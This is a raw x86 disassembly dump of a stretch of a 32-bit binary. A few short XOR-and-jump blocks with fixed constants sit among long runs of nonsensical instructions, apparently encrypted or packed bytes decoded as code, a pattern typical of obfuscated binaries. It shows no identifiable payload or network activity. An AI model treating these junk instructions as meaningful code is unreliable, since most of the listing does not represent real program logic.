  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shl    DWORD PTR [ebp-0xe],cl
  40c448:	enter  0x14f2,0x82
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	imul   ecx,DWORD PTR [ebx],0xffffffa0
  40c455:	xchg   edi,eax
  40c456:	jg     0x40c457
  40c458:	aam    0xdc
  40c45a:	daa    
  40c45b:	lods   eax,DWORD PTR ds:[esi]
  40c45c:	ret    0x8ed1
  40c45f:	adc    al,0x53
  40c461:	push   ds
  40c462:	jae    0x40c477
  40c464:	outs   dx,DWORD PTR ds:[esi]
  40c465:	leave  
  40c466:	sub    eax,0xa91fda60
  40c46b:	adc    DWORD PTR [eax+esi*2+0x78be6385],ebx
  40c472:	jne    0x40c424
  40c474:	adc    DWORD PTR [edi+0x73],ebp
  40c477:	sub    esp,DWORD PTR [esp+ebx*8]
  40c47a:	mov    ah,0xd1
  40c47c:	push   0x20
  40c47e:	xor    cl,BYTE PTR [esp+edx*2-0x3e2ae5a5]
  40c485:	inc    ecx
  40c486:	sbb    eax,0x881564d9
  40c48b:	out    dx,al
  40c48c:	(bad)  
  40c48d:	addr16 enter 0x7c6d,0xea
  40c492:	jnp    0x40c466
  40c494:	popa   
  40c495:	lds    edx,FWORD PTR ds:0x61dccde9
  40c49b:	iret   
  40c49c:	out    0x73,eax
  40c49e:	xchg   edi,eax
  40c49f:	and    esi,DWORD PTR [eax-0x77]
  40c4a2:	or     al,0x73
  40c4a4:	jb     0x40c45b
  40c4a6:	bnd jb 0x40c447
  40c4a9:	or     edx,DWORD PTR [ebx-0x6388e2ec]
  40c4af:	push   ecx
  40c4b0:	xchg   edi,eax
  40c4b1:	xchg   esi,eax
  40c4b2:	or     DWORD PTR [ecx],esp
  40c4b4:	aaa    
  40c4b5:	pop    ds
  40c4b6:	nop
  40c4b7:	sbb    al,0xa8
  40c4b9:	scas   eax,DWORD PTR es:[edi]
  40c4ba:	inc    edx
  40c4bb:	jne    0x40c53b
  40c4bd:	rcl    DWORD PTR ss:[ecx+0x46],1
  40c4c1:	cli    
  40c4c2:	mov    dl,BYTE PTR [ecx+0x371d4ec3]
  40c4c8:	(bad)  
  40c4c9:	or     edx,DWORD PTR [ecx]
  40c4cb:	mov    al,ds:0x54821c89
  40c4d0:	outs   dx,DWORD PTR fs:[esi]
  40c4d2:	int    0xc4
  40c4d4:	xchg   esp,eax
  40c4d5:	jg     0x40c50d
  40c4d7:	loopne 0x40c557
  40c4d9:	ja     0x40c498
  40c4db:	push   0xde623d5
  40c4e0:	data16 loope 0x40c4d6
  40c4e3:	xchg   ebp,eax
  40c4e4:	pop    ds
  40c4e5:	call   0xc9ea:0x6e686ad6
  40c4ec:	add    DWORD PTR [ecx],esp
  40c4ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ef:	enter  0xc621,0x64
  40c4f3:	dec    eax
  40c4f4:	sub    BYTE PTR [eax+ecx*1],bh
  40c4f7:	sbb    DWORD PTR [esi-0x621783bb],esp
  40c4fd:	dec    edx
  40c4fe:	sub    ebx,esp
  40c500:	xlat   BYTE PTR ds:[ebx]
  40c501:	sub    al,0xaa
  40c503:	sahf   
  40c504:	fistp  WORD PTR [ebx-0x7a]
  40c507:	sub    esi,DWORD PTR [ebx+0x1d04c7d3]
  40c50d:	fnstenv [edx]
  40c50f:	les    eax,FWORD PTR [ebp-0x7ae80c88]
  40c515:	aam    0x16
  40c517:	and    cl,BYTE PTR [ebp+0x14462342]
  40c51d:	push   0xffffffc8
  40c51f:	jmp    0x40c4e3
  40c521:	fild   DWORD PTR [esi-0x12d0889]
  40c527:	iret   
  40c528:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40c52a:	lds    esi,FWORD PTR [ebx]
  40c52c:	fild   DWORD PTR [esi-0x10]
  40c52f:	dec    DWORD PTR [edx+0x663b444c]
  40c535:	lea    ebx,ds:0xb3bcefef
  40c53b:	test   dl,0xf4
  40c53e:	dec    edi
  40c53f:	lea    ecx,[ebx+eax*2]
  40c542:	jmp    0x40c546
  40c544:	sbb    ebp,esi
  40c546:	cmp    BYTE PTR [edx+eax*4-0x4cb8e403],al
  40c54d:	mov    eax,0xe5f03112
  40c552:	mov    cl,BYTE PTR [edi*1-0x21088686]
  40c559:	shl    DWORD PTR ds:0x4ffb242e,cl
  40c55f:	leave  
  40c560:	push   ss
  40c561:	inc    ebx
  40c562:	(bad)  
  40c563:	fcomi  st,st(7)
  40c565:	dec    esi
  40c566:	aas    
  40c567:	mov    edi,0xf0ff95d6
  40c56c:	fs std 
  40c56e:	push   ds
  40c56f:	fimul  WORD PTR [ecx]
  40c571:	jg     0x40c561
  40c573:	mov    eax,0x451b651b
  40c578:	outs   dx,DWORD PTR ds:[esi]
  40c579:	pop    edx
  40c57a:	cmp    al,0x21
  40c57c:	dec    esi
  40c57d:	sbb    DWORD PTR [ecx],esi
  40c57f:	loope  0x40c550
  40c581:	mov    al,0x84
  40c583:	nop
  40c584:	jg     0x40c515
  40c586:	in     al,dx
  40c587:	les    ebx,FWORD PTR [ebp+edx*8+0x2c8adf22]
  40c58e:	push   0xffffff90
  40c590:	jmp    0x5d74:0xb6d992c9
  40c597:	out    0x65,al
  40c599:	repz mov edi,0x2cad5181
  40c59f:	cli    
  40c5a0:	sbb    DWORD PTR [ebx+edx*1-0x6c],ebx
  40c5a4:	mov    ebp,0xa28ea94
  40c5a9:	je     0x40c530
  40c5ab:	in     eax,dx
  40c5ac:	(bad)  
  40c5ad:	adc    al,bh
  40c5af:	jnp    0x40c534
  40c5b1:	rcr    BYTE PTR [ecx-0x2f],0xd
  40c5b5:	dec    esp
  40c5b6:	jno    0x40c5db
  40c5b8:	stc    
  40c5b9:	adc    ecx,eax
  40c5bb:	rol    DWORD PTR [ebx],cl
  40c5bd:	fcom   DWORD PTR [esi-0x3cdbfee1]
  40c5c3:	in     al,0x6a
  40c5c5:	sub    BYTE PTR [ebp+0x557e1f77],bh
  40c5cb:	inc    esp
  40c5cc:	inc    esp
  40c5cd:	js     0x40c594
  40c5cf:	test   eax,0xc3bd3a6b
  40c5d4:	add    esi,DWORD PTR [ecx+edi*4]
  40c5d7:	outs   dx,DWORD PTR ds:[esi]
  40c5d8:	mov    ebp,0x5d20c0ee
  40c5dd:	adc    al,0x2
  40c5df:	repz rol BYTE PTR [ecx],0x52
  40c5e3:	push   0x5c
  40c5e5:	sahf   
  40c5e6:	pushf  
  40c5e7:	(bad)  
  40c5e8:	(bad)  
  40c5e9:	es out 0x95,al
  40c5ec:	fcom   DWORD PTR [ecx+eiz*1-0x80]
  40c5f0:	dec    ebp
  40c5f1:	jmp    0x46ab:0xbc93af15
  40c5f8:	sub    al,0x22
  40c5fa:	cmp    al,0xe8
  40c5fc:	cmp    DWORD PTR [edx+esi*8],edi
  40c5ff:	shl    DWORD PTR ds:0x7e080d28,cl
  40c605:	out    dx,al
  40c606:	jge    0x40c60f
  40c608:	xor    edx,DWORD PTR [ebp-0x74814f8d]
  40c60e:	xor    ah,BYTE PTR [edx-0x1a]
  40c611:	int3   
  40c612:	pop    esp
  40c613:	push   es
  40c614:	jle    0x40c5c2
  40c616:	or     BYTE PTR [ecx],dh
  40c618:	fs std 
  40c61a:	push   cs
  40c61b:	cmp    BYTE PTR [ebx],cl
  40c61d:	jmp    0x128a96bd
  40c622:	icebp  
  40c623:	xchg   bh,ah
  40c625:	inc    edx
  40c626:	adc    eax,0x88cf2d74
  40c62b:	push   esi
  40c62c:	sahf   
  40c62d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c62e:	shl    DWORD PTR [ecx-0x78],1
  40c631:	enter  0x9fb1,0x17
  40c635:	shl    BYTE PTR [edx+0x49bbca8],0xa8
  40c63c:	inc    edi
  40c63d:	int3   
  40c63e:	pop    edi
  40c63f:	jp     0x40c5d9
  40c641:	sar    DWORD PTR fs:[ebp+0x2681a5ff],0x84
  40c649:	or     DWORD PTR [edi+0x6c],edx
  40c64c:	pop    ds
  40c64d:	(bad)  
  40c64f:	inc    ebp
  40c650:	data16 mov ch,0x83
  40c653:	imul   eax,eax,0x2e
  40c656:	dec    eax
  40c657:	or     al,0x72
  40c659:	sub    BYTE PTR [ecx],bl
  40c65b:	test   DWORD PTR [edx],esi
  40c65d:	push   ebx
  40c65e:	mov    bl,0x11
  40c660:	daa    
  40c661:	daa    
  40c662:	enter  0xe8d3,0x76
  40c666:	add    BYTE PTR [eax+ecx*4-0x5e],dh
  40c66a:	mov    edx,0xe684cb06
  40c66f:	scas   eax,DWORD PTR es:[edi]
  40c670:	ins    BYTE PTR es:[edi],dx
  40c671:	in     al,0x35
  40c673:	mov    dl,0x43
  40c675:	push   esi
  40c676:	dec    bl
  40c678:	mov    ds:0x1deb85b2,al
  40c67d:	icebp  
  40c67e:	cmp    bl,BYTE PTR [edi-0x9]
  40c681:	sbb    BYTE PTR [edi-0x30d242ab],al
  40c687:	test   al,0x54
  40c689:	nop
  40c68a:	neg    ebx
  40c68c:	stos   DWORD PTR es:[edi],eax
  40c68d:	or     dl,bl
  40c68f:	and    al,0x46
  40c691:	push   ebp
  40c692:	out    0x37,eax
  40c694:	in     eax,0xd6
  40c696:	loop   0x40c6a6
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0xa3a653f],dl
  40c6de:	xor    ebx,DWORD PTR [esi+0x7e7e80de]
  40c6e4:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c6e8:	ret    0x8e1c
  40c6eb:	and    eax,0x502609c5
  40c6f0:	ret    0xba54
  40c6f3:	pop    ebx
  40c6f4:	mov    edi,0xb89f93f2
  40c6f9:	dec    edx
  40c6fa:	ret    0x6cda
  40c6fd:	cmp    BYTE PTR [ebx],dl
  40c6ff:	push   ebp
  40c700:	jae    0x40c6e8
  40c702:	add    ecx,DWORD PTR [edx]
  40c704:	stc    
  40c705:	scas   eax,DWORD PTR es:[edi]
  40c706:	not    cl
  40c708:	mov    ch,0x73
  40c70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c70b:	mov    eax,0x89746f36
  40c710:	imul   ebp,DWORD PTR [eax],0x42158a32
  40c716:	mov    edi,DWORD PTR [esi]
  40c718:	mov    ah,0x6
  40c71a:	jg     0x40c78a
  40c71c:	mov    ecx,0x7d4476ee
  40c721:	popf   
  40c722:	dec    esp
  40c723:	lods   eax,DWORD PTR ds:[esi]
  40c724:	xor    bh,BYTE PTR gs:[ebp-0x49]
  40c728:	(bad)  
  40c729:	neg    BYTE PTR [edi+eiz*1]
  40c72c:	std    
  40c72d:	sub    eax,0xf61d0c0b
  40c732:	repnz pop eax
  40c734:	neg    BYTE PTR ds:0x9ef17b4d
  40c73a:	sbb    eax,0x4bd21234
  40c73f:	xchg   edx,eax
  40c740:	adc    esi,DWORD PTR [ecx]
  40c742:	dec    esp
  40c743:	pop    edx
  40c744:	mov    edx,0x779969f0
  40c749:	(bad)  
  40c74a:	mov    dl,0x4f
  40c74c:	mov    dl,0xbe
  40c74e:	push   0x6d743fcd
  40c753:	push   esi
  40c754:	pop    esi
  40c755:	push   ds
  40c756:	pop    eax
  40c757:	push   cs
  40c758:	aad    0x79
  40c75a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c75b:	sub    al,0xb9
  40c75d:	scas   eax,DWORD PTR es:[edi]
  40c75e:	retf   
  40c75f:	jmp    0xac07:0x78dc9207
  40c766:	js     0x40c6fb
  40c768:	sub    BYTE PTR [edi],dh
  40c76a:	rcr    BYTE PTR [edx+edx*1],1
  40c76d:	push   esp
  40c76e:	xor    eax,0xfe39d3fe
  40c773:	dec    ebx
  40c774:	aaa    
  40c775:	mov    cl,0x4f
  40c777:	mov    esi,0x7c1aa49e
  40c77c:	sar    eax,0xbc
  40c77f:	scas   al,BYTE PTR es:[edi]
  40c780:	xor    BYTE PTR [eax+0x0],dl
  40c783:	push   0xffffff8c
  40c785:	jmp    0x40c72b
  40c787:	jecxz  0x40c77e
  40c789:	cdq    
  40c78a:	xor    DWORD PTR [ebx-0x7735f9b7],edx
  40c790:	pusha  
  40c791:	adc    cl,BYTE PTR [esi-0x29628061]
  40c797:	inc    esp
  40c798:	xchg   ebx,eax
  40c799:	mov    bh,ch
  40c79b:	fdivr  QWORD PTR [ebx+0x17c84879]
  40c7a1:	xor    BYTE PTR [bx-0x63],ah
  40c7a5:	xchg   BYTE PTR [eax+0x68],bh
  40c7a8:	test   eax,0xcbce7017
  40c7ad:	or     al,BYTE PTR [esi+ebx*1-0x45e2f085]
  40c7b4:	sbb    BYTE PTR [esi+eax*4+0x2],0x72
  40c7b9:	sub    DWORD PTR [esi+0x67a1e774],esi
  40c7bf:	aad    0xcc
  40c7c1:	fnsave [ebp+0x4e4cf10f]
  40c7c7:	inc    ecx
  40c7c8:	popa   
  40c7c9:	mov    edx,0x6dbeb048
  40c7ce:	lods   al,BYTE PTR ds:[esi]
  40c7cf:	sub    ch,BYTE PTR [esi+0x972c217]
  40c7d5:	mov    esi,0x1c228b5c
  40c7da:	daa    
  40c7db:	mov    bh,BYTE PTR [eax]
  40c7dd:	outs   dx,DWORD PTR ds:[esi]
  40c7de:	add    al,0x69
  40c7e0:	sbb    al,0xcd
  40c7e2:	pop    ss
  40c7e3:	lahf   
  40c7e4:	stos   BYTE PTR es:[edi],al
  40c7e5:	and    bh,BYTE PTR [edx+0x2b]
  40c7e8:	int3   
  40c7e9:	popf   
  40c7ea:	and    DWORD PTR [ecx],0xfffffff7
  40c7ed:	push   ds
  40c7ee:	aad    0xf
  40c7f0:	jmp    DWORD PTR [ebp+0x6d]
  40c7f3:	pop    ecx
  40c7f4:	add    eax,ebp
  40c7f6:	jmp    0xe8ef:0x50b21d34
  40c7fd:	mov    ebp,0x9b881c9c
  40c802:	dec    esp
  40c803:	or     dh,BYTE PTR [edi-0x16]
  40c806:	sti    
  40c807:	xor    al,0xb2
  40c809:	les    ebx,FWORD PTR [ecx-0x322ad51f]
  40c80f:	dec    ecx
  40c810:	mov    DWORD PTR ds:0x5ee0e5,esi
  40c816:	cmp    eax,0x1adf5dfe
  40c81b:	dec    ebp
  40c81c:	sub    ch,BYTE PTR [esi]
  40c81e:	add    eax,DWORD PTR [ecx]
  40c820:	mov    ch,0x1b
  40c822:	std    
  40c823:	or     bh,cl
  40c825:	nop
  40c826:	ins    DWORD PTR es:[edi],dx
  40c827:	xor    al,0xd9
  40c829:	imul   DWORD PTR [ebx-0x31]
  40c82c:	or     BYTE PTR [ebx-0x67],0x89
  40c830:	lds    ebp,FWORD PTR [edi-0x1e]
  40c833:	add    al,0xe0
  40c835:	popa   
  40c836:	cld    
  40c837:	sbb    cl,BYTE PTR [ebx+edi*1-0x3c880199]
  40c83e:	add    al,0xb5
  40c840:	mov    ecx,0x39702877
  40c845:	dec    ebp
  40c846:	ret    0xc918
  40c849:	sbb    al,0x3c
  40c84c:	xchg   esi,eax
  40c84d:	sti    
  40c84e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c84f:	daa    
  40c850:	push   edi
  40c851:	rcl    DWORD PTR [esp+esi*4],cl
  40c854:	xor    bh,BYTE PTR [edx+0x7116b643]
  40c85a:	sub    al,0x78
  40c85d:	mov    DWORD PTR [ebp-0x26],esi
  40c860:	arpl   WORD PTR [ebx-0x8604975],si
  40c866:	xchg   ebx,eax
  40c867:	sbb    al,0xaf
  40c869:	bound  ebx,QWORD PTR [ebx+0x65]
  40c86c:	push   edi
  40c86d:	int3   
  40c86e:	leave  
  40c86f:	les    ecx,FWORD PTR [ebx+eax*4+0xb]
  40c873:	cdq    
  40c874:	jmp    0xdd53d7b7
  40c879:	fnsave [edx-0x77]
  40c87c:	or     bl,ch
  40c87e:	lods   al,BYTE PTR ds:[esi]
  40c87f:	out    0xf8,al
  40c881:	sbb    dh,0xb8
  40c884:	ret    0x9281
  40c887:	push   esp
  40c888:	cmp    BYTE PTR [eax],dh
  40c88a:	outs   dx,BYTE PTR ds:[esi]
  40c88b:	xor    BYTE PTR [eax],0xf2
  40c88e:	rcl    DWORD PTR [esi-0x1e],cl
  40c891:	ss dec edx
  40c893:	loopne 0x40c8bc
  40c895:	xchg   ebp,eax
  40c896:	pop    esp
  40c897:	loop   0x40c831
  40c899:	sub    ebx,ebp
  40c89b:	ins    DWORD PTR es:[edi],dx
  40c89c:	sub    DWORD PTR [ecx+0x47bd5b5],0x59
  40c8a3:	lea    ecx,[esp+ecx*8+0x36bae6a3]
  40c8aa:	sar    BYTE PTR [eax+0x35],0x10
  40c8ae:	dec    eax
  40c8af:	pop    ds
  40c8b0:	cmp    WORD PTR [ecx],bp
  40c8b3:	data16 cld 
  40c8b5:	into   
  40c8b6:	cli    
  40c8b7:	jb     0x40c865
  40c8b9:	lods   al,BYTE PTR ds:[esi]
  40c8ba:	lahf   
  40c8bb:	mov    cl,0xa0
  40c8bd:	gs mov ah,bl
  40c8c0:	add    DWORD PTR [eax+0x401ba84a],ebp
  40c8c6:	leave  
  40c8c7:	out    0x29,eax
  40c8c9:	mov    al,ds:0x40d5c442
  40c8ce:	(bad)  
  40c8cf:	fdiv   QWORD PTR [ebp+0x511c0012]
  40c8d5:	xchg   esi,eax
  40c8d6:	add    ch,BYTE PTR [ebx]
  40c8d8:	and    eax,0xe3da3363
  40c8dd:	dec    edi
  40c8de:	out    0x52,eax
  40c8e0:	bound  ebp,QWORD PTR [esi+0x44dafa26]
  40c8e6:	push   es
  40c8e7:	jb     0x40c8b9
  40c8e9:	dec    ecx
  40c8ea:	scas   al,BYTE PTR es:[edi]
  40c8eb:	js     0x40c8b6
  40c8ed:	pop    ss
  40c8ee:	mov    al,ds:0xc088f01c
  40c8f3:	or     BYTE PTR [ecx],0x42
  40c8f6:	sar    DWORD PTR [ebp+ebp*8-0x29f4621e],1
  40c8fd:	aam    0xfe
  40c8ff:	sub    BYTE PTR [ebp*1-0x29bd36a2],al
  40c906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c907:	pop    es
  40c908:	loop   0x40c921
  40c90a:	sbb    ecx,DWORD PTR [esi+0x6fed6389]
  40c910:	lock add cl,BYTE PTR [edx-0x5d4bb3b1]
  40c917:	inc    ebp
  40c919:	mov    ebx,esi
  40c91b:	int3   
  40c91c:	cmp    BYTE PTR [ecx],0x46
  40c91f:	(bad)  
  40c920:	jg     0x40c966
  40c922:	ds pop ebp
  40c924:	rcl    DWORD PTR [eax+0x6d7ddb9e],cl
  40c92a:	xchg   esp,eax
  40c92b:	int    0xd
  40c92d:	dec    BYTE PTR [ebx-0x3eccebab]
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [eax-0x24],edi
  40c946:	ret    
  40c947:	sub    DWORD PTR [eax+0x387e7e8e],ebx
  40c94d:	jl     0x40c9cd
  40c94f:	jle    0x40c98b
  40c951:	nop
  40c952:	cs ss mov ah,0x18
  40c956:	adc    BYTE PTR [edi],ch
  40c958:	mov    ch,0x6d
  40c95a:	xor    dl,dl
  40c95c:	xor    edx,DWORD PTR [edi-0x61c5c5b2]
  40c962:	lahf   
  40c963:	rol    DWORD PTR [ecx+0x1b573015],0x8f
  40c96a:	jmp    0x2657285f
  40c96f:	adc    BYTE PTR [eax+0x6b],bl
  40c972:	cmp    BYTE PTR [esi-0x30],ch
  40c975:	inc    ecx
  40c976:	std    
  40c977:	pop    edi
  40c978:	or     edx,esi
  40c97a:	popa   
  40c97b:	adc    esi,DWORD PTR [edi]
  40c97d:	mov    bh,0x33
  40c97f:	pop    edx
  40c980:	mov    esp,0x14610c75
  40c985:	pop    ebp
  40c986:	aad    0x73
  40c988:	jmp    0xf25ce62c
  40c98d:	pop    edx
  40c98e:	lods   al,BYTE PTR ds:[esi]
  40c98f:	and    eax,0x3dd40efd
  40c994:	mov    eax,ds:0xac0db0be
  40c999:	add    eax,0x87f9b219
  40c99e:	mov    ebp,esp
  40c9a0:	cmp    ebp,DWORD PTR [edx]
  40c9a2:	mov    BYTE PTR [edi-0x1bfd031d],bh
  40c9a8:	icebp  
  40c9a9:	out    0x2,eax
  40c9ab:	and    BYTE PTR [ecx],al
  40c9ad:	jo     0x40c9a7
  40c9af:	pop    esi
  40c9b0:	or     eax,0xb06b6d55
  40c9b5:	sub    esi,DWORD PTR [esi+0x61]
  40c9b8:	add    ebp,0xffffffa3
  40c9bb:	int    0x6a
  40c9bd:	leave  
  40c9be:	fbstp  TBYTE PTR fs:[ebp+0x5a]
  40c9c2:	mov    ecx,0x70e5cab5
  40c9c7:	cmp    BYTE PTR [edi+0x75],bl
  40c9ca:	jl     0x40c9c6
  40c9cc:	mov    ch,0x2
  40c9ce:	mov    ebp,0x51a26dc1
  40c9d3:	push   ds
  40c9d4:	pop    ecx
  40c9d5:	mov    ah,BYTE PTR [esi-0x3e]
  40c9d8:	sar    bl,1
  40c9da:	mov    ebx,ecx
  40c9dc:	loope  0x40c9a7
  40c9de:	adc    al,0x96
  40c9e0:	pusha  
  40c9e1:	pop    ds
  40c9e2:	inc    ebx
  40c9e3:	inc    edi
  40c9e4:	outs   dx,DWORD PTR ds:[esi]
  40c9e5:	mov    ecx,0xe722e82b
  40c9ea:	mov    al,0x22
  40c9ec:	dec    edi
  40c9ed:	stos   DWORD PTR es:[edi],eax
  40c9ee:	or     eax,0xe7d3713c
  40c9f3:	outs   dx,BYTE PTR ds:[esi]
  40c9f4:	mov    ch,0x47
  40c9f6:	cwde   
  40c9f7:	call   0x4eac:0x9e3890c
  40c9fe:	in     al,0xec
  40ca00:	jno    0x40c9b3
  40ca02:	inc    eax
  40ca03:	xchg   esi,eax
  40ca04:	repz (bad) 
  40ca06:	cmp    BYTE PTR [esi+0x1c],dh
  40ca09:	mov    edx,0x977b0c66
  40ca0e:	pop    ebx
  40ca0f:	mov    al,0xa7
  40ca11:	push   0xfd89bd81
  40ca16:	je     0x40ca31
  40ca18:	mov    ebx,0xe191363e
  40ca1d:	rol    BYTE PTR [eax-0x3700e3a1],1
  40ca23:	neg    esp
  40ca25:	jle    0x40ca74
  40ca27:	bound  esp,QWORD PTR [ebx]
  40ca29:	pop    ebx
  40ca2a:	sbb    DWORD PTR [eax+0x2],edx
  40ca2d:	xor    al,0xf9
  40ca2f:	push   0xe
  40ca31:	sub    bl,bl
  40ca33:	aaa    
  40ca34:	call   0x93f:0xa704d853
  40ca3b:	or     DWORD PTR [edi-0x187128b5],esi
  40ca41:	cs jns 0x40cac2
  40ca44:	sti    
  40ca45:	out    0x99,al
  40ca47:	jnp    0x40ca7a
  40ca49:	xor    dh,BYTE PTR [esi]
  40ca4b:	add    BYTE PTR [eax+0x47],al
  40ca4e:	pop    ecx
  40ca4f:	cmp    ecx,DWORD PTR [edi+0x69]
  40ca52:	mov    ch,0x27
  40ca54:	lahf   
  40ca55:	(bad)  
  40ca56:	cmp    ah,BYTE PTR [ebx-0x67]
  40ca59:	sbb    ah,0xbd
  40ca5c:	pop    esp
  40ca5d:	js     0x40c9fb
  40ca5f:	or     DWORD PTR [edx+0x5a],esp
  40ca62:	push   ebx
  40ca63:	pop    esi
  40ca64:	cmp    al,0x68
  40ca66:	shl    BYTE PTR [ebp+0x1b],cl
  40ca69:	mov    ds:0x63f13b56,al
  40ca6e:	repnz inc edi
  40ca70:	das    
  40ca71:	mov    gs,WORD PTR [eax+edi*4+0x1e37a706]
  40ca78:	sbb    dh,0x4a
  40ca7b:	lods   eax,DWORD PTR ds:[esi]
  40ca7c:	sar    BYTE PTR [edi+ecx*2+0x2f],0x74
  40ca81:	ja     0x40ca22
  40ca83:	jo     0x40ca0a
  40ca85:	sub    al,0xc7
  40ca87:	gs dec eax
  40ca89:	(bad)  
  40ca8a:	cld    
  40ca8b:	sbb    al,BYTE PTR [esi+0x27e00505]
  40ca91:	stc    
  40ca92:	(bad)  
  40ca93:	pop    eax
  40ca94:	repnz mov ds:0xa25da169,al
  40ca9a:	adc    DWORD PTR [edx+ebx*1-0x27],ebp
  40ca9e:	aam    0x96
  40caa0:	es sbb cl,al
  40caa3:	scas   al,BYTE PTR es:[edi]
  40caa4:	sbb    al,0xd
  40caa6:	daa    
  40caa7:	gs out dx,al
  40caa9:	dec    ecx
  40caaa:	aam    0xf5
  40caac:	xor    DWORD PTR [ecx-0x65f8ad3d],esi
  40cab2:	ror    bl,1
  40cab4:	inc    ebp
  40cab5:	gs stos DWORD PTR es:[edi],eax
  40cab7:	icebp  
  40cab8:	cmp    BYTE PTR [ecx+0x7837e41c],ch
  40cabe:	sub    BYTE PTR [ebx-0x42],0x5d
  40cac2:	mov    ?,esi
  40cac4:	not    DWORD PTR [esi+0x5c8bfb85]
  40caca:	add    dl,BYTE PTR [esi]
  40cacc:	in     al,dx
  40cacd:	and    BYTE PTR [ebx-0x12227a8f],bl
  40cad3:	and    DWORD PTR [edi+ebx*2+0x46],ebx
  40cad7:	jg     0x40ca59
  40cad9:	and    eax,0x8630bda5
  40cade:	or     DWORD PTR [edx],edx
  40cae0:	rcr    BYTE PTR ds:0xa92b6b5c,1
  40cae6:	(bad)  
  40cae7:	fwait
  40cae8:	lahf   
  40cae9:	stc    
  40caea:	or     al,BYTE PTR [eax-0x29538cb6]
  40caf0:	pop    ebp
  40caf1:	popa   
  40caf2:	loope  0x40cb36
  40caf4:	fstp   DWORD PTR [ebx-0x12b260b]
  40cafa:	ja     0x40cb5e
  40cafc:	popf   
  40cafd:	or     eax,0x1f2a63df
  40cb02:	lds    esi,FWORD PTR [eax-0x55]
  40cb05:	(bad)  
  40cb06:	push   ebx
  40cb07:	xchg   esi,eax
  40cb08:	rcr    DWORD PTR [esi+0x65fd092d],0x75
  40cb0f:	out    dx,eax
  40cb10:	test   DWORD PTR [edx],ebp
  40cb12:	jmp    0x3243ab2
  40cb17:	and    eax,0x16ea6464
  40cb1c:	dec    eax
  40cb1d:	adc    ebx,DWORD PTR [edi+0x74]
  40cb20:	sahf   
  40cb21:	mov    edi,0x6354338f
  40cb26:	rcr    BYTE PTR [ebp+0x56203f8d],0x33
  40cb2d:	pop    es
  40cb2e:	clc    
  40cb2f:	push   0x3d8dec80
  40cb34:	and    al,ch
  40cb36:	shl    edi,1
  40cb38:	retf   0x41e9
  40cb3b:	sub    BYTE PTR [edx],cl
  40cb3d:	jno    0x40cb2a
  40cb3f:	cdq    
  40cb40:	adc    DWORD PTR [edx],0xffffffc4
  40cb43:	into   
  40cb44:	in     al,0x15
  40cb46:	dec    edx
  40cb47:	pop    edx
  40cb48:	jne    0x40cb71
  40cb4a:	jns    0x40cb5e
  40cb4c:	mov    ds:0xac37b36d,al
  40cb51:	mov    WORD PTR [ebp+0x60ff3d68],ds
  40cb57:	out    dx,al
  40cb58:	icebp  
  40cb59:	jle    0x40cb87
  40cb5b:	mov    ebx,0x4f9741ff
  40cb60:	sbb    eax,0xf578072
  40cb65:	or     esp,esp
  40cb67:	ins    DWORD PTR es:[edi],dx
  40cb68:	bound  ebp,QWORD PTR [edi+edx*4+0x65]
  40cb6c:	cmp    al,0xe8
  40cb6e:	ret    
  40cb6f:	shr    DWORD PTR [eax-0x2e],1
  40cb72:	jo     0x40cba5
  40cb74:	out    dx,al
  40cb75:	adc    BYTE PTR [esp+edx*8],al
  40cb78:	dec    ecx
  40cb79:	pop    ebp
  40cb7a:	adc    edi,DWORD PTR [esi+0x2b11f4b9]
  40cb80:	push   es
  40cb81:	rcr    BYTE PTR [esi+0x18e1c7f3],0xb3
  40cb88:	sbb    DWORD PTR [eax-0x2a7a97da],ebx
  40cb8e:	nop
  40cb8f:	mov    DWORD PTR [eax-0x5d929954],0xfc603dc
  40cb99:	scas   eax,DWORD PTR es:[edi]
  40cb9a:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
